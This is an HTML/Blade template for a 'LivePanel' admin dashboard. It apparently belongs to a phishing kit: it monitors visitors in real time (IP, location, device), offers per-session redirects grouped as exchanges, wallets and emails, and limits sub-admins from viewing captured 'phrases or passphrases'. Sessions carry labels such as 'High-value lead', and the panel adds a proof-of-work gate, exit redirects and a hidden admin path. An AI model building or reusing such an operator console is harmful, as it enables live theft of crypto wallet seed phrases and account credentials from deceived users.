<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>LivePanel Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/htmx.org@2.0.3/dist/htmx.min.js"></script>
    <script src="https://unpkg.com/idiomorph@0.3.0/dist/idiomorph-ext.min.js"></script>
    <link rel="stylesheet" href="/css/admin-dashboard.css?v=76">
</head>
<body class="bg-black text-white min-h-screen font-mono">

<div class="flex h-screen overflow-hidden">

    {{-- Static sidebar — never reloads --}}
    <div style="width:68px;flex-shrink:0;background:#000;border-right:1px solid rgba(255,255,255,.08);display:flex;flex-direction:column;z-index:10;">
        {{-- Logo area (empty / black) --}}
        <div style="height:68px;flex-shrink:0;border-bottom:1px solid rgba(255,255,255,.08);background:#000;box-sizing:border-box;"></div>
        {{-- Nav buttons --}}
        <div class="nav-btn-group">
            <button id="nav-sessions-btn" class="nav-btn is-active" data-admin-nav="sessions" title="Sessions">
                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
            </button>
            <button id="nav-settings-btn" class="nav-btn" data-admin-nav="settings" title="Settings">
                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
            </button>
            @if($adminRole === 'master')
            <button id="nav-subadmins-btn" class="nav-btn" data-admin-nav="subadmins" title="Sub-Admins">
                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="7" r="4"/><path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/><line x1="19" y1="8" x2="19" y2="14"/><line x1="16" y1="11" x2="22" y2="11"/></svg>
            </button>
            @endif
        </div>
        {{-- Logout --}}
        <div style="padding:10px;border-top:1px solid rgba(255,255,255,.08);display:flex;flex-direction:column;align-items:center;gap:6px;">
            <form method="POST" action="{{ route('admin.logout') }}">
                @csrf
                <button type="submit" title="Logout" class="nav-btn-logout">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
                </button>
            </form>
        </div>
    </div>

    {{-- Main area --}}
    <div style="flex:1;display:flex;flex-direction:row;overflow:hidden;min-width:0;">

        {{-- Left column: header + all content views --}}
        <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0;position:relative;">

        {{-- Section-switch overlay --}}
        <div id="section-overlay" style="position:absolute;inset:0;background:#000;z-index:100;opacity:0;pointer-events:none;transition:opacity .15s ease;"></div>

        {{-- Unified header — same height/style for all sections --}}
        <div style="background:#000;border-bottom:1px solid rgba(255,255,255,.08);height:68px;flex-shrink:0;display:flex;align-items:center;gap:12px;padding:0 20px;box-sizing:border-box;">
            <button id="back-btn" class="hdr-back-btn" type="button" data-sessions-control="back" style="display:none">Back</button>
            <span id="header-view-label" style="font-family:monospace;font-size:12px;font-weight:700;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.1em;">Sessions</span>
            <div id="header-current-page" style="display:none;align-items:center;gap:10px;flex-shrink:0;">
                <div style="display:flex;align-items:center;gap:8px;">
                    <div id="flow-page-icon" class="w-2 h-2 rounded-full bg-gray-700 flex-shrink-0"></div>
                    <span id="flow-page-name" class="text-white text-xs font-medium">—</span>
                </div>
            </div>
            <div id="header-session-meta" style="display:none;align-items:center;gap:0;min-width:0;">
                <div id="header-token-wrap" class="pr-4" style="display:none;align-items:center;gap:8px;">
                    <span id="selected-token-label" style="font-family:monospace;font-size:13px;font-weight:900;color:#fff;">—</span>
                    <button id="header-rename-btn" class="hdr-rename-btn" type="button" data-sessions-control="rename" title="Rename session">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                            <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                        </svg>
                    </button>
                </div>
                <div id="info-ip-wrap"           class="hdr-info" style="display:none"><div class="hdr-info-label">IP</div><span id="info-ip" class="hdr-info-val">—</span></div>
                <div id="info-location-wrap"     class="hdr-info" style="display:none"><div class="hdr-info-label">Location</div><span id="info-location" class="hdr-info-val">—</span></div>
                <div id="info-started-wrap"      class="hdr-info" style="display:none"><div class="hdr-info-label">Started</div><span id="info-started" class="hdr-info-val">—</span></div>
                <div id="info-browser-wrap"      class="hdr-info" style="display:none"><div class="hdr-info-label">Browser</div><span id="info-browser" class="hdr-info-val">—</span></div>
                <div id="info-device-wrap"       class="hdr-info" style="display:none"><div class="hdr-info-label">Device</div><span id="info-device" class="hdr-info-val">—</span></div>
                <div id="info-lastresponse-wrap" class="hdr-info" style="display:none"><div class="hdr-info-label">Last Response</div><span id="info-lastresponse" class="hdr-info-val">—</span></div>
            </div>
            <div style="margin-left:auto;display:flex;align-items:center;gap:10px;">
                @if($adminRole === 'sub' && $subAdminLabel)
                <span style="font-family:monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.35);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);padding:3px 10px;border-radius:3px;letter-spacing:.06em;text-transform:uppercase;">{{ $subAdminLabel }}</span>
                @endif
                <span id="site-live-label" class="text-[10px] text-green-400 font-mono">ONLINE</span>
            </div>
        </div>

        {{-- Sessions overview (full-width, shown by default) --}}
        <div id="view-sessions" style="flex:1;overflow-y:auto;">
            <div id="offline-session-banner" style="display:none;width:100%;max-width:900px;margin:20px auto 0;padding:0 28px;">
                <div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:8px;padding:14px 18px;display:flex;align-items:center;gap:10px;">
                    <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#f87171;flex-shrink:0;"></span>
                    <span style="font-family:monospace;font-size:11px;font-weight:700;color:#f87171;letter-spacing:.05em;">PLATFORM OFFLINE</span>
                    <span style="font-family:monospace;font-size:11px;color:rgba(255,255,255,.35);margin-left:4px;">— New visitors are not being tracked. Existing sessions remain active.</span>
                </div>
            </div>
            <div id="session-list"
                 hx-ext="morph"
                 hx-get="{{ route('admin.sessions') }}"
                 hx-trigger="every 1000ms"
                 hx-swap="morph:innerHTML"
                 style="display:block;width:100%;max-width:900px;margin:0 auto;padding:20px 28px;">
                <div style="text-align:center;padding:64px 20px;font-family:monospace;font-size:13px;font-weight:700;color:rgba(255,255,255,.3);">Loading sessions...</div>
            </div>
        </div>

        {{-- Detail view (shown after selecting a session) --}}
        <div id="view-detail" class="admin-view-hidden" style="flex:1;overflow:hidden;flex-direction:column;min-height:0;display:flex;">

            {{-- Event feed --}}
            <div id="feed-panel" class="flex flex-col min-w-0 overflow-hidden" style="flex:1 1 0%;min-width:280px;position:relative;">
                <div id="event-feed" class="flex-1 overflow-y-auto p-5">
                    <div class="text-white text-sm font-semibold text-center py-12" style="opacity:.4;">
                        Select a session from the sidebar to monitor it
                    </div>
                </div>

            </div>
        </div>{{-- /view-detail --}}

        {{-- Settings view (shown when settings nav is active) --}}
        <div id="view-settings" class="admin-view-hidden" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;min-height:0;">
            <div class="settings-page">
                <div class="settings-grid">

                    {{-- ── LEFT COLUMN ────────────────────────────────────── --}}
                    <div class="settings-col">

                        {{-- Online Super Admins (#online-admins-card) removed from Settings design 2026-08-17. Leftover JS/routes stay until later teardown. --}}

                        {{-- Platform Status --}}
                        <div class="settings-row settings-row--toggle">
                            <div class="settings-copy">
                                <div class="settings-title">Platform Status</div>
                                <p id="settings-status-desc" class="settings-desc">
                                    The platform is currently <span id="settings-status-word" class="text-green-400 font-medium">online</span>. Users can access all pages normally.
                                </p>
                            </div>
                            <label class="toggle-wrap flex-shrink-0">
                                <input type="checkbox" class="toggle-input" id="platform-toggle" checked data-settings-control="platform">
                                <span class="toggle-track"></span>
                            </label>
                        </div>

                        {{-- Proof-of-Work --}}
                        <div class="settings-row settings-row--toggle">
                            <div class="settings-copy">
                                <div class="settings-title">Proof-of-Work Challenge</div>
                                <p id="pow-desc" class="settings-desc">
                                    PoW is currently <span id="pow-status-word" class="text-green-400 font-medium">enabled</span>. Users must solve a challenge before entering the platform.
                                </p>
                            </div>
                            <label class="toggle-wrap flex-shrink-0">
                                <input type="checkbox" class="toggle-input" id="pow-toggle" checked data-settings-control="pow">
                                <span class="toggle-track"></span>
                            </label>
                        </div>

                        {{-- Entry Page Picker --}}
                        <div class="settings-row">
                            <div class="settings-title">Default Landing Page</div>
                            <p class="settings-desc">The page users land on when they visit the site. Auto-discovered from all registered routes.</p>
                            <div class="ep-picker" id="ep-picker">
                                <button class="ep-trigger" id="ep-trigger" type="button" data-settings-control="entry-trigger">
                                    <span class="ep-trigger-text" id="ep-trigger-label">Loading…</span>
                                    <span class="ep-trigger-url" id="ep-trigger-url"></span>
                                    <svg class="ep-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
                                </button>
                                <div class="ep-dropdown" id="ep-dropdown"></div>
                            </div>
                            <input type="hidden" id="entry-page-select" value="">
                        </div>

                    </div>{{-- /left column --}}

                    {{-- ── RIGHT COLUMN ───────────────────────────────────── --}}
                    <div class="settings-col">

                        {{-- New Session Alert --}}
                        <div class="settings-row settings-row--toggle">
                            <div class="settings-copy">
                                <div class="settings-title">New Session Alert</div>
                                <p class="settings-desc">Alert when a user opens the platform for the first time.</p>
                            </div>
                            <label class="toggle-wrap flex-shrink-0">
                                <input type="checkbox" class="toggle-input" id="notif-session-toggle" checked data-notify-control="session">
                                <span class="toggle-track"></span>
                            </label>
                        </div>

                        {{-- Loading Page Alert --}}
                        <div class="settings-row settings-row--toggle">
                            <div class="settings-copy">
                                <div class="settings-title">Loading Page Alert</div>
                                <p class="settings-desc">Alert when a user enters the loading / waiting screen.</p>
                            </div>
                            <label class="toggle-wrap flex-shrink-0">
                                <input type="checkbox" class="toggle-input" id="notif-loading-toggle" checked data-notify-control="loading">
                                <span class="toggle-track"></span>
                            </label>
                        </div>

                        {{-- Session Exit URL --}}
                        <div class="settings-row">
                            <div class="settings-title">Session Exit URL</div>
                            <p class="settings-desc">Where users are redirected when you close their session. Leave empty to use the default offline page.</p>
                            <input id="exit-url" type="text" maxlength="500" placeholder="e.g. https://google.com"
                                   class="settings-field"
                                   autocomplete="off"
                                   data-settings-control="exit-url" />
                        </div>

                    </div>{{-- /right column --}}

                </div>
            </div>
        </div>{{-- /view-settings --}}

        {{-- Sub-admins view (master only) --}}
        @if($adminRole === 'master')
        <div id="view-subadmins" class="admin-view-hidden" style="flex:1;overflow-y:auto;">
            <div style="max-width:600px;margin:0 auto;padding:24px 32px;">
                <div style="margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;">
                    <div>
                        <div style="font-family:monospace;font-size:13px;font-weight:900;color:#fff;letter-spacing:.04em;">SUB-ADMINS</div>
                        <div style="font-family:monospace;font-size:10px;color:rgba(255,255,255,.35);margin-top:3px;">Sub-admins can monitor sessions but cannot view phrases or passphrases.</div>
                    </div>
                    <button type="button" data-subadmin-control="create-open" style="background:#6366f1;color:#fff;font-family:monospace;font-size:11px;font-weight:700;padding:7px 14px;border:none;border-radius:4px;cursor:pointer;">+ New Sub-Admin</button>
                </div>
                <div id="sub-admins-list" style="display:flex;flex-direction:column;gap:8px;">
                    <div style="text-align:center;padding:40px 0;font-family:monospace;font-size:11px;color:rgba(255,255,255,.2);">Loading...</div>
                </div>
            </div>
        </div>
        @endif

        </div>{{-- /left column --}}

        {{-- Resize handle --}}
        <div id="resize-handle"
             style="display:none;width:14px;flex-shrink:0;background:transparent;position:relative;z-index:10;">
            <div style="position:absolute;top:68px;bottom:0;left:0;width:1px;background:rgba(255,255,255,0.15);"></div>
            <div style="position:absolute;top:68px;bottom:0;right:0;width:1px;background:rgba(255,255,255,0.15);"></div>
        </div>

        {{-- Flows panel (full page height) --}}
        <div id="flows-panel" class="bg-black flex flex-col overflow-hidden" style="display:none;width:620px;flex-shrink:1;min-width:360px;position:relative;">

            {{-- Placeholder — no session selected --}}
            <div id="flows-placeholder" class="flex-1 flex flex-col items-center justify-center p-6 text-center gap-3">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                    <circle cx="9" cy="7" r="4"/>
                    <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                    <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
                </svg>
                <div>
                    <div class="text-white text-sm font-bold mb-1">No session selected</div>
                    <div class="text-white text-xs leading-relaxed font-medium" style="opacity:.45;">Select a session from<br>the sidebar to control<br>where to redirect the user</div>
                </div>
            </div>

            {{-- Content — shown when session selected --}}
            <div id="flows-content" class="fc-content" style="display:none;">

                {{-- Current page indicator --}}
                <div id="current-page-box" class="px-4 border-b border-gray-800" style="height:68px;box-sizing:border-box;display:flex;align-items:center;justify-content:flex-end;">
                    <span id="site-live-label-flows" class="text-[10px] text-green-400 font-mono">ONLINE</span>
                    <span id="flow-page-url" class="text-gray-600 text-[10px] font-mono" style="display:none;">—</span>
                </div>

                {{-- Redirect buttons --}}
                <div class="fc-scroll p-4" style="position:relative;">
                    {{-- Category tabs --}}
                    <div id="redirect-tabs" style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px;">
                        <button id="tab-all" onclick="setRedirectTab('all')" style="padding:4px 10px;font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border-radius:6px;border:1px solid #374151;background:#000;color:#9ca3af;cursor:pointer;transition:background .15s,color .15s;">All</button>
                        <button id="tab-exchangers" onclick="setRedirectTab('exchangers')" style="padding:4px 10px;font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border-radius:6px;border:1px solid #374151;background:#000;color:#9ca3af;cursor:pointer;transition:background .15s,color .15s;">Exchanges</button>
                        <button id="tab-wallets" onclick="setRedirectTab('wallets')" style="padding:4px 10px;font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border-radius:6px;border:1px solid #374151;background:#000;color:#9ca3af;cursor:pointer;transition:background .15s,color .15s;">Wallets</button>
                        <button id="tab-emails" onclick="setRedirectTab('emails')" style="padding:4px 10px;font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border-radius:6px;border:1px solid #374151;background:#000;color:#9ca3af;cursor:pointer;transition:background .15s,color .15s;">Emails</button>
                    </div>
                    <div id="redirect-btn-list" class="flex flex-col gap-2"></div>
                </div>

            </div>

        </div>{{-- /flows-panel --}}

    </div>{{-- /main area --}}
</div>{{-- /outer flex --}}

@if($adminRole === 'master')
{{-- Create sub-admin modal --}}
<div id="create-subadmin-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center">
    <div class="bg-gray-800 rounded-xl p-6 w-full max-w-sm border border-gray-700">
        <h2 class="text-white font-semibold mb-1 text-sm">New Sub-Admin</h2>
        <p class="text-gray-500 text-xs mb-3">A unique access URL will be generated. Sub-admins can monitor sessions but cannot view phrases or passphrases.</p>
        <input id="subadmin-label-input" type="text" maxlength="60" placeholder="Operator name (e.g. Operator 1)"
               class="w-full bg-gray-900 border border-gray-600 text-white text-sm rounded-lg px-3 py-2 focus:outline-none focus:ring-1 focus:ring-indigo-500 mb-3">
        <div id="subadmin-create-err" style="display:none;font-family:monospace;font-size:10px;color:#f87171;margin-bottom:8px;"></div>
        <div class="flex gap-2">
            <button type="button" data-subadmin-control="create-close" class="flex-1 border border-gray-600 text-gray-400 text-sm py-2 rounded-lg hover:bg-gray-700">Cancel</button>
            <button type="button" data-subadmin-control="create-submit" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white text-sm py-2 rounded-lg font-medium">Create</button>
        </div>
    </div>
</div>
@endif

{{-- Rename session modal --}}
<div id="rename-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center">
    <div class="bg-gray-800 rounded-xl p-6 w-full max-w-sm border border-gray-700">
        <h2 class="text-white font-semibold mb-1 text-sm">Rename Session</h2>
        <p class="text-gray-500 text-xs mb-3">Give this client a custom label.</p>
        <input id="rename-input" type="text" maxlength="40" placeholder="e.g. High-value lead"
               class="w-full bg-gray-900 border border-gray-600 text-white text-sm rounded-lg px-3 py-2 focus:outline-none focus:ring-1 focus:ring-indigo-500 mb-3">
        <div class="flex gap-2">
            <button type="button" data-sessions-control="rename-close"
                    class="flex-1 border border-gray-600 text-gray-400 text-sm py-2 rounded-lg hover:bg-gray-700">Cancel</button>
            <button type="button" data-sessions-control="rename-submit"
                    class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white text-sm py-2 rounded-lg font-medium">Save</button>
        </div>
    </div>
</div>

{{-- Clean events modal --}}
<div id="clean-modal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
    <div class="bg-gray-950 border border-gray-800 rounded-xl w-full max-w-lg flex flex-col" style="max-height:80vh">

        {{-- Header --}}
        <div class="flex items-center justify-between px-5 py-4 border-b border-gray-800">
            <div>
                <h2 class="text-white font-semibold text-sm tracking-tight">Clean Event Feed</h2>
                <p class="text-gray-600 text-[11px] mt-0.5">Select categories to delete. Uncheck what you want to keep.</p>
            </div>
            <button onclick="closeCleanModal()" class="text-gray-700 hover:text-gray-400 text-xl leading-none ml-4 transition-colors">&times;</button>
        </div>

        {{-- Category list --}}
        <div id="clean-event-list" class="flex-1 overflow-y-auto p-4 flex flex-col gap-2"></div>

        {{-- Footer --}}
        <div class="flex items-center justify-end px-5 py-3 border-t border-gray-800">
            <button onclick="executeClean()"
                    style="background:#dc2626;border:1px solid #dc2626;color:#fff;border-radius:3px;font-family:monospace;font-size:12px;font-weight:700;padding:8px 20px;cursor:pointer;transition:background .15s;"
                    onmouseover="this.style.background='#b91c1c'"
                    onmouseout="this.style.background='#dc2626'">
                Delete
            </button>
        </div>
    </div>
</div>


<script>
window._ADMIN = {
    sessionsUrl: '{{ route("admin.sessions") }}',
    @if($adminRole === 'master')
    subAdminsJsonUrl: '{{ route("admin.sub-admins.json") }}',
    subAdminsCreateUrl: '{{ route("admin.sub-admins.create") }}',
    subAdminDeleteBase: '{{ url("/admin777888xxx/sub-admin") }}',
    @endif
};
</script>
<script>window.ADMIN_ROLE = '{{ $adminRole }}';</script>
<script src="/js/admin-dashboard.js?v=270"></script>
<script type="module" src="/js/admin/app.js?v=272"></script>

</body>
</html>

